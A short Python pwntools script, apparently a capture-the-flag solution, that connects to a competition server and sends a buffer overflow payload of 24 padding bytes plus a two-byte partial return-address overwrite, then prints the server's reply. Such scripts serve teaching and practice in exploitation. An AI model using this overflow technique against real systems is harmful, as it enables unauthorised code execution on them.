from pwn import *
p = remote('ctf.compfest.id', 7002)
payload = b'A'*24 + b'\x9a\x11'
print("payload =", payload)
p.recvuntil(b'>> ')
p.send(payload)
p.shutdown('send')
try:
    print(p.recvall().decode())
except EOFError:
    pass
